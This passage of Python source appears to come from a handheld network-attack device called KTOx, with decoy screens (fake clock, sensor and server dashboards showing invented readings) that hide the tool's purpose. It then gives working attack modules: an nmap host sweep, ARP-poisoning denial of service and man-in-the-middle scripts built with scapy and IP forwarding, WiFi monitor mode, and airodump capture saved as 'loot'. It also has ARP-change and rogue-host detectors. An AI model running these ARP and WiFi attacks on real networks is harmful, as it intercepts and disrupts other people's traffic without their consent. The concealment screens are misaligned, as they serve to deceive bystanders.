    draw.line([(0, 13), (128, 13)], fill=(22, 32, 80), width=1)

    # ── TIME  HH:MM  (rows 18–54, centered, large font) ──────────────────────
    t_str = now.strftime("%H") + colon + now.strftime("%M")
    # Glow colour: blue-white pulsing
    r = int(140 + 90 * pulse)
    g = int(175 + 55 * pulse)
    b = 255
    glow_col = (r, g, b)
    # Shadow pass (offset 1px, darker) for depth
    shadow = (max(0, r - 80), max(0, g - 80), 80)
    try:
        bbox = draw.textbbox((0, 0), t_str, font=sf["big"])
        tw = bbox[2] - bbox[0]
        tx = (128 - tw) // 2
        draw.text((tx + 1, 19), t_str, font=sf["big"], fill=shadow)
        draw.text((tx,     18), t_str, font=sf["big"], fill=glow_col)
    except Exception:
        # Fallback: use menu font at known position
        draw.text((8, 18), t_str, font=small_font, fill=glow_col)

    # ── SECONDS  SS  (rows 56–76, centred, medium font) ──────────────────────
    sec_str = now.strftime("%S")
    sec_col = (int(60 + 60 * pulse), int(110 + 60 * pulse), 210)
    try:
        bbox2 = draw.textbbox((0, 0), sec_str, font=sf["sec"])
        sw = bbox2[2] - bbox2[0]
        sx = (128 - sw) // 2
        draw.text((sx, 56), sec_str, font=sf["sec"], fill=sec_col)
    except Exception:
        draw.text((56, 56), sec_str, font=small_font, fill=sec_col)

    # ── SECONDS PROGRESS BAR (row 80–83) ─────────────────────────────────────
    BAR_X, BAR_Y, BAR_W, BAR_H = 6, 80, 116, 4
    elapsed = now.second + frac
    filled  = int(BAR_W * elapsed / 60.0)
    # Track (dark)
    draw.rectangle([BAR_X, BAR_Y, BAR_X + BAR_W, BAR_Y + BAR_H - 1],
                   fill=(18, 24, 60))
    # Filled portion
    if filled > 0:
        bar_col = (int(40 + 40 * pulse), int(100 + 60 * pulse), 220)
        draw.rectangle([BAR_X, BAR_Y, BAR_X + filled, BAR_Y + BAR_H - 1],
                       fill=bar_col)
    # Glowing tip
    if 0 < filled < BAR_W:
        tip_x = BAR_X + filled
        draw.rectangle([tip_x - 1, BAR_Y - 1, tip_x + 1, BAR_Y + BAR_H],
                       fill=(200, 230, 255))

    # ── DATE LINE (row 88–100) ────────────────────────────────────────────────
    date_str = now.strftime("%a %d %b %Y")
    date_col = (75, 100, 165)
    try:
        bbox3 = draw.textbbox((0, 0), date_str, font=sf["med"])
        dw = bbox3[2] - bbox3[0]
        dx = (128 - dw) // 2
        draw.text((dx, 88), date_str, font=sf["med"], fill=date_col)
    except Exception:
        draw.text((4, 88), date_str, font=small_font, fill=date_col)

    # ── BOTTOM DIVIDER + NOTIFICATION STUB (row 104–127) ─────────────────────
    draw.line([(0, 104), (128, 104)], fill=(22, 32, 80), width=1)
    notif_col = (55, 75, 130)
    try:
        draw.text((4, 107), "No new notifications", font=sf["sml"], fill=notif_col)
        draw.text((4, 118), now.strftime("Updated %H:%M"), font=sf["sml"],
                  fill=(40, 55, 100))
    except Exception:
        pass

    return image   # global image — caller passes to LCD_ShowImage(image, 0, 0)


# ── Stealth theme 2: Environmental sensor hub ─────────────────────────────────
def _stealth_sensor(ts):
    """
    Fake smart-home environmental sensor dashboard.
    All values drift slowly via sine waves — looks like real sensor data.
    Draws into global image/draw. Must be called while holding draw_lock.
    """
    now = datetime.fromtimestamp(ts)
    sf  = _stealth_fonts()

    # Slowly drifting "sensor" values — long-period sine waves
    temp_c   = round(21.3 + 0.4 * math.sin(ts / 97.0),  1)
    humidity = round(47.0 + 2.1 * math.sin(ts / 131.0), 1)
    co2      = int(  412  + 18  * math.sin(ts / 73.0))
    pressure = round(1013.2 + 0.6 * math.sin(ts / 211.0), 1)
    lux      = int(  238  + 14  * math.sin(ts / 53.0))
    # AQI stays Good (lower is better) with tiny drift
    aqi      = int(22 + 3 * abs(math.sin(ts / 180.0)))
    aqi_label = "GOOD" if aqi < 50 else "MODERATE"
    aqi_col   = (50, 200, 80) if aqi < 50 else (240, 180, 20)

    def _bar(y, pct, col):
        """Draw a small progress bar at row y."""
        W = 60
        draw.rectangle([44, y, 44 + W, y + 5], fill=(18, 24, 60))
        filled = max(1, int(W * pct / 100))
        draw.rectangle([44, y, 44 + filled, y + 5], fill=col)

    # Background
    draw.rectangle([0, 0, 127, 127], fill=(4, 8, 18))

    # Header bar
    draw.rectangle([0, 0, 127, 13], fill=(10, 40, 80))
    try:
        draw.text((3, 2),  "SENSOR HUB", font=sf["sml"], fill=(100, 160, 220))
        draw.text((80, 2), now.strftime("%H:%M"), font=sf["sml"], fill=(160, 200, 255))
    except Exception:
        pass
    draw.line([(0, 14), (128, 14)], fill=(20, 50, 100), width=1)

    # Row layout — each row: label | bar | value
    rows = [
        # (label, bar_pct, bar_colour, value_str, value_colour)
        ("TEMP",  min(100, int((temp_c / 40) * 100)),
         (255, 120, 40),   f"{temp_c}\xb0C",   (255, 180, 100)),
        ("HUMID", int(humidity),
         (50, 160, 230),   f"{humidity}%",     (120, 200, 255)),
        ("CO2",   min(100, int((co2 / 1000) * 100)),
         (100, 200, 80),   f"{co2}ppm",        (140, 220, 120)),
        ("PRESS", 55,
         (180, 80, 220),   f"{pressure}hPa",   (200, 150, 255)),
        ("LUX",   min(100, int(lux / 500 * 100)),
         (220, 200, 50),   f"{lux}lx",         (240, 220, 120)),
    ]

    y = 18
    for label, pct, bar_col, val_str, val_col in rows:
        try:
            draw.text((2, y),  label[:5], font=sf["sml"], fill=(80, 110, 160))
            _bar(y + 1, pct, bar_col)
            draw.text((107, y), val_str[:8], font=sf["sml"], fill=val_col)
        except Exception:
            pass
        y += 14

    # Divider + AQI row
    draw.line([(0, y + 2), (128, y + 2)], fill=(20, 40, 80), width=1)
    try:
        draw.text((2, y + 5),  "AIR:",      font=sf["sml"], fill=(70, 90, 140))
        draw.text((30, y + 5), aqi_label,   font=sf["sml"], fill=aqi_col)
        draw.text((2, y + 16), f"AQI {aqi} · {lux}lx",
                  font=sf["sml"], fill=(60, 80, 130))
    except Exception:
        pass

    return image


# ── Stealth theme 3: System / server monitor ──────────────────────────────────
def _stealth_sysmon(ts, _start=[None]):
    """
    Fake system resource monitor — looks like a headless server dashboard.
    CPU/RAM/net values drift via sine waves. Uptime counts from first call.
    Draws into global image/draw. Must be called while holding draw_lock.
    """
    if _start[0] is None:
        _start[0] = ts
    uptime_s = int(ts - _start[0]) + 172800 + 50400  # fake: 2d 14h base

    sf = _stealth_fonts()

    # Fake metrics
    cpu   = round(18.0 + 22.0 * abs(math.sin(ts / 11.0))
                       + 8.0  * abs(math.sin(ts / 4.7)),  1)
    ram_u = round(1.72 + 0.18 * math.sin(ts / 47.0), 2)
    ram_t = 3.87
    ram_p = int(ram_u / ram_t * 100)
    disk_u = 12.4
    disk_t = 31.9
    disk_p = int(disk_u / disk_t * 100)
    cpu_t = round(41.0 + 3.0 * math.sin(ts / 23.0), 1)
    net_rx = round(abs(8.4  + 5.1 * math.sin(ts / 7.3)),  1)
    net_tx = round(abs(1.2  + 0.9 * math.sin(ts / 9.1)),  1)
    load1  = round(abs(0.44 + 0.18 * math.sin(ts / 31.0)), 2)
    load5  = round(abs(0.38 + 0.10 * math.sin(ts / 61.0)), 2)

    # Uptime string
    d = uptime_s // 86400
    h = (uptime_s % 86400) // 3600
    m = (uptime_s % 3600)  // 60
    up_str = f"{d}d {h:02d}h {m:02d}m"

    def _bar(y, pct, col, warn_col=(220, 80, 40), warn=80):
        W = 50
        c = warn_col if pct >= warn else col
        draw.rectangle([44, y, 44 + W, y + 4], fill=(18, 24, 60))
        filled = max(1, int(W * pct / 100))
        draw.rectangle([44, y, 44 + filled, y + 4], fill=c)

    # Background
    draw.rectangle([0, 0, 127, 127], fill=(4, 8, 18))

    # Header
    draw.rectangle([0, 0, 127, 13], fill=(20, 10, 50))
    try:
        draw.text((3, 2), "SYS MONITOR", font=sf["sml"], fill=(160, 100, 255))
        draw.text((88, 2), datetime.fromtimestamp(ts).strftime("%H:%M"),
                  font=sf["sml"], fill=(200, 160, 255))
    except Exception:
        pass
    draw.line([(0, 14), (128, 14)], fill=(40, 20, 80), width=1)

    y = 18
    try:
        draw.text((2, y), f"UP {up_str}", font=sf["sml"], fill=(70, 90, 150))
    except Exception:
        pass
    y += 12
    draw.line([(0, y), (128, y)], fill=(20, 15, 45), width=1)
    y += 3

    rows = [
        ("CPU",  int(cpu),  (100, 180, 255), f"{cpu:.0f}%"),
        ("RAM",  ram_p,     (180, 100, 255), f"{ram_u}/{ram_t:.0f}G"),
        ("DISK", disk_p,    (100, 220, 160), f"{disk_u}/{disk_t:.0f}G"),
        ("TEMP", int(cpu_t),(255, 140,  60), f"{cpu_t}\xb0C"),
    ]
    for label, pct, col, val in rows:
        try:
            draw.text((2, y),   label, font=sf["sml"], fill=(70, 80, 130))
            _bar(y + 1, pct, col)
            draw.text((97, y),  val,   font=sf["sml"], fill=col)
        except Exception:
            pass
        y += 13

    draw.line([(0, y + 1), (128, y + 1)], fill=(20, 15, 45), width=1)
    y += 4
    try:
        draw.text((2, y),
                  f"LD {load1} {load5}",
                  font=sf["sml"], fill=(90, 100, 160))
        draw.text((2, y + 11),
                  f"\u2191{net_tx}KB \u2193{net_rx}KB/s",
                  font=sf["sml"], fill=(80, 160, 120))
    except Exception:
        pass

    return image


# ── Theme registry ────────────────────────────────────────────────────────────
_STEALTH_THEMES = [
    _stealth_clock_fallback,   # 0 — animated lock-screen clock
    _stealth_sensor,           # 1 — environmental sensor hub
    _stealth_sysmon,           # 2 — system / server monitor
]
_stealth_theme_idx = 0


def _draw_stealth_theme(ts):
    """Call the active stealth theme renderer."""
    global _stealth_theme_idx
    fn = _STEALTH_THEMES[_stealth_theme_idx % len(_STEALTH_THEMES)]
    return fn(ts)


def enter_stealth():
    """
    Lock the LCD with a decoy clock screen.
    Exit: hold KEY1 + KEY3 for 3 s, or WebUI toggle
    (write {"stealth":false} to /dev/shm/ktox_stealth.json).
    """
    ktox_state["stealth"] = True
    screen_lock.set()   # freeze _display_loop and _stats_loop

    held_since  = None
    STEALTH_CMD  = "/dev/shm/ktox_stealth.json"
    STATE_FILE   = "/dev/shm/ktox_device_stealth.txt"
    # Signal WebUI that stealth is active
    try:
        open(STATE_FILE, "w").write("1")
    except Exception:
        pass
    # Clear any stale WebUI exit command from before stealth started
    try:
        os.remove(STEALTH_CMD)
    except Exception:
        pass

    global _stealth_theme_idx
    _stealth_theme_idx = 0          # always start on clock theme
    _sysmon_start = [None]          # reset sysmon uptime counter each entry
    key2_held_since = None          # for 5-second theme-switch hold
    THEME_HOLD_SEC  = 5.0

    try:
        while True:
            # ── Draw current theme ────────────────────────────────────────────
            if HAS_HW and LCD and image:
                _ts = time.time()
                with draw_lock:
                    try:
                        _draw_stealth_theme(_ts)
                        LCD.LCD_ShowImage(image, 0, 0)
                    except Exception as _e:
                        print(f"[STEALTH] {_e!r}", flush=True)

            # ── WebUI toggle ──────────────────────────────────────────────────
            try:
                if os.path.isfile(STEALTH_CMD):
                    data = json.loads(Path(STEALTH_CMD).read_text())
                    os.remove(STEALTH_CMD)
                    if not data.get("stealth", True):
                        break
            except Exception:
                pass

            # ── KEY2 held 5 s → cycle theme ───────────────────────────────────
            if HAS_HW:
                try:
                    k2 = GPIO.input(PINS["KEY2_PIN"]) == 0
                    if k2:
                        if key2_held_since is None:
                            key2_held_since = time.time()
                        elif time.time() - key2_held_since >= THEME_HOLD_SEC:
                            _stealth_theme_idx = (
                                _stealth_theme_idx + 1) % len(_STEALTH_THEMES)
                            key2_held_since = None   # require re-hold for next
                            # Brief flash to confirm theme change
                            with draw_lock:
                                draw.rectangle([0, 0, 127, 127], fill=(0, 0, 0))
                                LCD.LCD_ShowImage(image, 0, 0)
                            time.sleep(0.3)
                    else:
                        key2_held_since = None
                except Exception:
                    pass

            # ── KEY1 + KEY3 held 3 s → exit ───────────────────────────────────
            if HAS_HW:
                try:
                    k1 = GPIO.input(PINS["KEY1_PIN"]) == 0
                    k3 = GPIO.input(PINS["KEY3_PIN"]) == 0
                    if k1 and k3:
                        if held_since is None:
                            held_since = time.time()
                        elif time.time() - held_since >= 3.0:
                            break
                    else:
                        held_since = None
                except Exception:
                    pass

            time.sleep(0.2)
    finally:
        ktox_state["stealth"] = False
        screen_lock.clear()
        try:
            open(STATE_FILE, "w").write("0")
        except Exception:
            pass
        Dialog_info("Stealth off", wait=False, timeout=1.5)

# ═══════════════════════════════════════════════════════════════════════════════
# ── Attack helpers ─────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _run_attack(title, cmd, shell=False):
    """Live-streaming attack runner with KEY3=stop."""
    ts      = datetime.now().strftime("%Y%m%d_%H%M%S")
    logpath = f"{LOOT_DIR}/atk_{title.lower().replace(' ','_')}_{ts}.log"
    os.makedirs(LOOT_DIR, exist_ok=True)
    logfh   = open(logpath, "w")

    proc = subprocess.Popen(
        cmd, shell=shell,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1
    )
    ktox_state["running"] = title
    lines   = [f"Starting {title}…"]
    elapsed = 0

    def _reader():
        for line in proc.stdout:
            line = line.strip()
            if line:
                logfh.write(f"[{time.strftime('%H:%M:%S')}] {line}\n")
                logfh.flush()
                lines.append(line[:22])
                if len(lines) > 5: lines.pop(0)
    threading.Thread(target=_reader, daemon=True).start()

    try:
        while proc.poll() is None:
            with draw_lock:
                _draw_toolbar()
                color.DrawMenuBackground()
                color.DrawBorder()
                draw.rectangle([3,14,124,26], fill=color.select)
                _centered(title[:18], 15, fill=color.selected_text)
                pulse = "●" if elapsed % 2 == 0 else "○"
                draw.text((115,15), pulse, font=text_font, fill=color.border)
                y = 30
                for line in lines[-5:]:
                    c = "#1E8449" if line.startswith("✔") else \
                        "#C0392B" if line.startswith("✖") else \
                        "#D4AC0D" if line.startswith("!") else color.text
                    draw.text((5,y), line[:20], font=text_font, fill=c)
                    y += 12
                draw.text((5,108), f"Elapsed: {elapsed}s",
                          font=small_font, fill="#606060")
                draw.rectangle([3,116,124,124], fill="#222222")
                _centered("KEY3=stop", 117, font=small_font,
                          fill=color.text)
            btn = getButton(timeout=1)
            if btn == "KEY3_PIN": break
            elapsed += 1
    except KeyboardInterrupt:
        pass
    finally:
        if proc.poll() is None:
            proc.terminate()
            try: proc.wait(timeout=3)
            except: proc.kill()
        logfh.close()
        ktox_state["running"] = None
    return elapsed


def _pick_host():
    hosts = ktox_state["hosts"]
    if not hosts:
        Dialog_info("No hosts.\nRun scan first.", wait=True)
        return None

    items = []
    for h in hosts:
        ip = h.get("ip", "?") if isinstance(h, dict) else (h[0] if len(h) > 0 else "?")
        items.append(ip.strip())

    WINDOW = 6
    total  = len(items)
    sel    = 0

    while True:
        offset = max(0, min(sel-2, total-WINDOW))
        window = items[offset:offset+WINDOW]

        with draw_lock:
            _draw_toolbar()
            draw.rectangle([0,12,128,128], fill=color.background)
            color.DrawBorder()
            draw.rectangle([3,13,125,24], fill=color.title_bg)
            _centered("Pick Target", 13, font=small_font, fill=color.border)
            draw.line([3,24,125,24], fill=color.border, width=1)
            for i, ip in enumerate(window):
                row_y  = 26 + 13*i
                is_sel = (i == sel-offset)
                if is_sel:
                    draw.rectangle([3, row_y, 124, row_y+12], fill=color.select)
                draw.text((5, row_y+1), ip[:22], font=text_font,
                          fill=color.selected_text if is_sel else color.text)
            draw.line([3,112,125,112], fill="#2a0505", width=1)
            _centered("CTR=select  LEFT=back", 114, font=small_font, fill="#4a2020")

        time.sleep(0.08)
        btn = getButton(timeout=0.5)
        if   btn is None:                               continue
        elif btn == "KEY_DOWN_PIN":                     sel = (sel+1) % total
        elif btn == "KEY_UP_PIN":                       sel = (sel-1) % total
        elif btn in ("KEY_PRESS_PIN","KEY_RIGHT_PIN"):  return items[sel].strip()
        elif btn in ("KEY_LEFT_PIN","KEY1_PIN",
                     "KEY2_PIN","KEY3_PIN"):            return None

# ═══════════════════════════════════════════════════════════════════════════════
# ── KTOx attack modules ────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def do_network_scan():
    Dialog_info("Scanning network…", wait=False, timeout=1)
    gw = ktox_state["gateway"]
    if not gw:
        Dialog_info("No gateway!\nCheck connection.", wait=True)
        return
    net = gw.rsplit(".",1)[0]+".0/24"
    rc, out = _run(["nmap","-sn","-T4","--oG","-",net], timeout=90)
    import re
    hosts = []
    for mo in re.finditer(r"Host: (\d+\.\d+\.\d+\.\d+)\s+\(([^)]*)\)", out):
        hosts.append({"ip":mo.group(1),"hostname":mo.group(2),"mac":"","vendor":""})
    ktox_state["hosts"] = hosts
    lines = [f"✔ {len(hosts)} host(s) found", f"  Net: {net}"]
    for h in hosts[:4]: lines.append(f"  {h['ip']}")
    if len(hosts)>4: lines.append(f"  +{len(hosts)-4} more")
    GetMenu(lines)


# ── ARP helpers ────────────────────────────────────────────────────────────────

def _ask_pps():
    """Select packets per second using a spinner (no list scrolling)."""
    rates = [5, 10, 25, 50, 100, 250, 500, 1000]
    idx = 4  # start at 100 pkt/s
    while True:
        with draw_lock:
            _draw_toolbar()
            draw.rectangle([0, 12, 128, 128], fill=color.background)
            color.DrawBorder()
            draw.rectangle([3, 13, 125, 24], fill=color.title_bg)
            _centered("PACKETS/SEC", 13, font=small_font, fill=color.border)
            draw.line([3, 24, 125, 24], fill=color.border, width=1)
            _centered(str(rates[idx]), 48, font=text_font, fill=color.selected_text)
            draw.text((4, 80), "UP/DOWN  change", font=small_font, fill=color.text)
            draw.text((4, 95), "OK  select",      font=small_font, fill=color.text)
            draw.text((4, 110), "K3  cancel",     font=small_font, fill=color.text)
        btn = getButton(timeout=0.5)
        if btn == "KEY_UP_PIN":
            idx = (idx + 1) % len(rates)
        elif btn == "KEY_DOWN_PIN":
            idx = (idx - 1) % len(rates)
        elif btn in ("KEY_PRESS_PIN", "KEY_RIGHT_PIN"):
            return rates[idx]
        elif btn in ("KEY_LEFT_PIN", "KEY1_PIN", "KEY3_PIN"):
            return None
        # else continue


def _get_interface_for_ip(ip):
    """Return the network interface used to reach the given IP."""
    try:
        rc, out = _run(["ip", "route", "get", ip], timeout=2)
        import re
        m = re.search(r"dev\s+(\S+)", out)
        if m:
            return m.group(1)
    except:
        pass
    return ktox_state["iface"]  # fallback


def _get_mac_arping(ip, iface, timeout=2):
    """Use system arping to get MAC address."""
    try:
        cmd = ["arping", "-c", "1", "-I", iface, "-w", str(timeout), ip]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+1)
        import re
        m = re.search(r"\[([0-9a-fA-F:]{17})\]", proc.stdout)
        if m:
            return m.group(1).upper()
    except Exception:
        pass
    return ""

def _scapy_resolve(ip, iface):
    """
    Return MAC for ip, or empty string on failure.
    Tries: ARP cache, arping, then scapy.
    """
    # 1. Check local ARP cache
    rc, out = _run(["arp", "-n", ip], timeout=3)
    if rc == 0:
        import re
        m = re.search(r"([0-9a-fA-F:]{17})", out)
        if m:
            mac = m.group(1).upper()
            if mac != "FF:FF:FF:FF:FF:FF":
                return mac
    # 2. Try system arping
    mac = _get_mac_arping(ip, iface)
    if mac:
        return mac
    # 3. Fallback to scapy
    script = (
        "import sys,logging;"
        "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
        "from scapy.all import srp,Ether,ARP;"
        f"ans,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst='{ip}'),"
        f"iface='{iface}',timeout=2,verbose=0,retry=2);"
        "print(ans[0][1][Ether].src if ans else '')"
    )
    try:
        r = subprocess.run(["python3", "-c", script],
                           capture_output=True, text=True, timeout=8)
        mac = r.stdout.strip()
        if mac:
            return mac.upper()
    except Exception:
        pass
    return ""


def _scapy_restore(target_ip, target_mac, gw_ip, gw_mac, iface, my_mac):
    """Send 10 correct ARP replies to restore both sides."""
    script = (
        "import sys,time,logging;"
        "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
        "from scapy.all import Ether,ARP,sendp;"
        f"iface='{iface}';"
        f"t_ip='{target_ip}';t_mac='{target_mac}';"
        f"g_ip='{gw_ip}';g_mac='{gw_mac}';"
        "for _ in range(10):\n"
        "  sendp(Ether(src=g_mac,dst=t_mac)/ARP(op=2,hwsrc=g_mac,psrc=g_ip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface)\n"
        "  sendp(Ether(src=t_mac,dst=g_mac)/ARP(op=2,hwsrc=t_mac,psrc=t_ip,hwdst=g_mac,pdst=g_ip),verbose=False,iface=iface)\n"
        "  time.sleep(0.01)"
    )
    try:
        subprocess.run(["python3", "-c", script],
                       capture_output=True, timeout=10)
    except Exception:
        pass


def do_arp_kick(target_ip, pps=10):
    """Bidirectional ARP poison (target + gateway) at configurable PPS."""
    # Find correct interface for the target
    iface = _get_interface_for_ip(target_ip)
    gw    = ktox_state["gateway"]
    if not gw:
        Dialog_info("No gateway!\nRun scan first.", wait=True)
        return

    Dialog_info(f"Resolving MACs…\n{target_ip} via {iface}", wait=False, timeout=1)
    target_mac = _scapy_resolve(target_ip, iface)
    gw_mac     = _scapy_resolve(gw, iface)
    if not target_mac:
        Dialog_info(f"MAC resolve\nfailed for\n{target_ip}", wait=True)
        return

    interval = 1.0 / max(1, pps)
    script = (
        "import sys,time,logging,signal;"
        "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
        "from scapy.all import Ether,ARP,sendp,get_if_hwaddr;"
        "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
        f"iface='{iface}';"
        f"my=get_if_hwaddr(iface);"
        f"t_ip='{target_ip}';t_mac='{target_mac}';"
        f"g_ip='{gw}';g_mac='{gw_mac}';"
        f"iv={interval!r};"
        "while True:"
        "  # Poison target: gateway IP is at my MAC"
        "  sendp(Ether(src=my,dst=t_mac)/ARP(op=2,hwsrc=my,psrc=g_ip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface);"
        "  # Poison gateway: target IP is at my MAC"
        "  if g_mac:"
        "    sendp(Ether(src=my,dst=g_mac)/ARP(op=2,hwsrc=my,psrc=t_ip,hwdst=g_mac,pdst=g_ip),verbose=False,iface=iface);"
        "  time.sleep(iv)"
    )
    proc = subprocess.Popen(["python3", "-c", script],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ktox_state["running"] = f"ARP KICK {pps}/s"
    Dialog_info(f"ARP KICK\n{target_ip}\n{pps} pkt/s bidir\nvia {iface}\nKEY3=stop", wait=True)
    proc.terminate()
    try:
        proc.wait(timeout=2)
    except Exception:
        proc.kill()
    ktox_state["running"] = None
    if target_mac and gw_mac:
        _scapy_restore(target_ip, target_mac, gw, gw_mac, iface, "")
    Dialog_info("Kick stopped.\nARP restored.", wait=False, timeout=1)


def do_mitm(target_ip):
    """Bidirectional ARP MITM using Scapy. Enables IP forwarding."""
    iface = _get_interface_for_ip(target_ip)
    gw    = ktox_state["gateway"]
    if not gw:
        Dialog_info("No gateway!\nRun scan first.", wait=True)
        return

    Dialog_info(f"Resolving MACs…\n{target_ip} via {iface}", wait=False, timeout=1)
    target_mac = _scapy_resolve(target_ip, iface)
    gw_mac     = _scapy_resolve(gw, iface)
    if not target_mac or not gw_mac:
        Dialog_info("MAC resolve\nfailed.", wait=True)
        return

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    script = (
        "import sys,time,logging,signal;"
        "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
        "from scapy.all import Ether,ARP,sendp,get_if_hwaddr;"
        "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
        f"iface='{iface}';"
        f"my=get_if_hwaddr(iface);"
        f"t_ip='{target_ip}';t_mac='{target_mac}';"
        f"g_ip='{gw}';g_mac='{gw_mac}';"
        "while True:"
        "  sendp(Ether(src=my,dst=t_mac)/ARP(op=2,hwsrc=my,psrc=g_ip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface);"
        "  sendp(Ether(src=my,dst=g_mac)/ARP(op=2,hwsrc=my,psrc=t_ip,hwdst=g_mac,pdst=g_ip),verbose=False,iface=iface);"
        "  time.sleep(0.5)"
    )
    proc = subprocess.Popen(["python3", "-c", script],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ktox_state["running"] = "MITM"
    Dialog_info(f"MITM ACTIVE\n{target_ip}\nFwd ON\nKEY3=stop", wait=True)
    proc.terminate()
    try:
        proc.wait(timeout=2)
    except Exception:
        proc.kill()
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    ktox_state["running"] = None
    _scapy_restore(target_ip, target_mac, gw, gw_mac, iface, "")
    Dialog_info("MITM stopped.\nFwd OFF.\nARP restored.", wait=False, timeout=2)


def _wifi_list_ifaces():
    import re as _re
    rc, out = _run(["iw", "dev"], timeout=6)
    if rc != 0:
        return []
    return _re.findall(r"Interface\s+(\w+)", out)


def _wifi_iface_mode(iface):
    import re as _re
    rc, out = _run(["iw", "dev", iface, "info"], timeout=6)
    if rc != 0:
        return ""
    m = _re.search(r"\btype\s+(\w+)", out)
    return m.group(1).lower() if m else ""


def _detect_monitor_iface(preferred=None):
    candidates = []
    if preferred:
        candidates.append(preferred)
    state_mon = ktox_state.get("mon_iface")
    if state_mon and state_mon not in candidates:
        candidates.append(state_mon)
    for iface in _wifi_list_ifaces():
        if iface not in candidates:
            candidates.append(iface)
    for iface in candidates:
        if _wifi_iface_mode(iface) == "monitor":
            return iface
    return None


def _require_monitor_iface():
    mon = _detect_monitor_iface(preferred=ktox_state.get("mon_iface"))
    if not mon:
        Dialog_info("Enable monitor\nmode first.", wait=True)
        return None
    ktox_state["mon_iface"] = mon
    return mon


def do_wifi_monitor_on():
    iface = ktox_state["wifi_iface"]
    Dialog_info(f"Enabling mon\n{iface}…", wait=False, timeout=1)

    existing = set(_wifi_list_ifaces())
    _run(["airmon-ng", "check", "kill"], timeout=10)
    _run(["ip", "link", "set", iface, "up"], timeout=5)
    _run(["airmon-ng", "start", iface], timeout=20)

    now_ifaces = _wifi_list_ifaces()
    created = [i for i in now_ifaces if i not in existing]
    mon = _detect_monitor_iface(preferred=created[0] if created else None)
    if mon:
        ktox_state["mon_iface"] = mon
        Dialog_info(f"Monitor on:\n{mon}", wait=True)
        return

    Dialog_info("Trying iw\nfallback…", wait=False, timeout=1)
    _run(["systemctl", "stop", "NetworkManager"], timeout=5)
    _run(["ip", "link", "set", iface, "down"], timeout=5)
    _run(["iw", "dev", iface, "set", "type", "monitor"], timeout=5)
    _run(["ip", "link", "set", iface, "up"], timeout=5)

    mon = _detect_monitor_iface(preferred=iface)
    if mon:
        ktox_state["mon_iface"] = mon
        Dialog_info(f"Monitor on:\n{mon} (iw)", wait=True)
    else:
        Dialog_info("Monitor FAILED\nCheck adapter.", wait=True)


def do_wifi_monitor_off():
    iface = ktox_state["wifi_iface"]
    mon = ktox_state.get("mon_iface") or _detect_monitor_iface(preferred=iface)
    if not mon:
        Dialog_info("Not in monitor\nmode.", wait=True)
        return

    rc, _ = _run(["airmon-ng", "stop", mon], timeout=10)
    if rc != 0 and _wifi_iface_mode(mon) == "monitor":
        _run(["ip", "link", "set", mon, "down"], timeout=5)
        _run(["iw", "dev", mon, "set", "type", "managed"], timeout=5)
        _run(["ip", "link", "set", mon, "up"], timeout=5)

    _run(["systemctl", "start", "NetworkManager"], timeout=8)
    if _wifi_iface_mode(mon) == "monitor":
        Dialog_info("Monitor still on.\nCheck adapter.", wait=True)
    else:
        ktox_state["mon_iface"] = None
        Dialog_info("Monitor off.\nNM restarted.", wait=True)


def do_wifi_scan():
    mon = _require_monitor_iface()
    if not mon:
        return
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    outpath = f"{LOOT_DIR}/wifi_scan_{ts}"
    _run_attack("WiFi SCAN",
        ["airodump-ng","--write",outpath,"--output-format","csv",
         "--write-interval","3",mon])


def do_arp_watch():
    _run_attack("ARP WATCH", [
        "python3", "-c",
        "import subprocess, time\n"
        "print('ARP Watch — KEY3=stop')\n"
        "def snap():\n"
        "    out = subprocess.check_output(['arp','-an'],text=True,timeout=5)\n"
        "    t = {}\n"
        "    for ln in out.splitlines():\n"
        "        p = ln.split()\n"
        "        try:\n"
        "            ip=p[1].strip('()'); mac=p[3]\n"
        "            if mac!='<incomplete>': t[ip]=mac\n"
        "        except: pass\n"
        "    return t\n"
        "base=snap(); print(f'Baseline: {len(base)} entries')\n"
        "while True:\n"
        "    time.sleep(8); cur=snap()\n"
        "    for ip,mac in cur.items():\n"
        "        if ip in base and base[ip]!=mac:\n"
        "            print(f'! POISON {ip} {base[ip][:11]}->{mac[:11]}')\n"
        "        elif ip not in base:\n"
        "            print(f'+ NEW {ip} {mac}')\n"
        "    base=cur\n"
    ])

def do_arp_diff():
    _run_attack("ARP DIFF",[
        "python3","-c",
        "import subprocess,time\n"
        "def arp():\n"
        "  out=subprocess.check_output(['arp','-an'],text=True)\n"
        "  t={}\n"
        "  for line in out.splitlines():\n"
        "    p=line.split()\n"
        "    try:\n"
        "      ip=p[1].strip('()');mac=p[3]\n"
        "      if mac!='<incomplete>':t[ip]=mac\n"
        "    except:pass\n"
        "  return t\n"
        "base=arp()\n"
        "print(f'Baseline: {len(base)} entries')\n"
        "while True:\n"
        "  time.sleep(5);cur=arp()\n"
        "  for ip,mac in cur.items():\n"
        "    if ip in base and base[ip]!=mac:\n"
        "      print(f'! CHANGE {ip} {base[ip][:11]} -> {mac[:11]}');base[ip]=mac\n"
        "    elif ip not in base:\n"
        "      print(f'+ NEW {ip} {mac}');base[ip]=mac"
    ])


def do_rogue_detect():
    gw  = ktox_state["gateway"]
    net = gw.rsplit(".",1)[0]+".0/24" if gw else "192.168.1.0/24"
    _run_attack("ROGUE DETECT",[
        "python3","-c",
        f"""
import sys,time; sys.path.insert(0,'{KTOX_DIR}')
import scan
hosts=scan.scanNetwork('{net}')
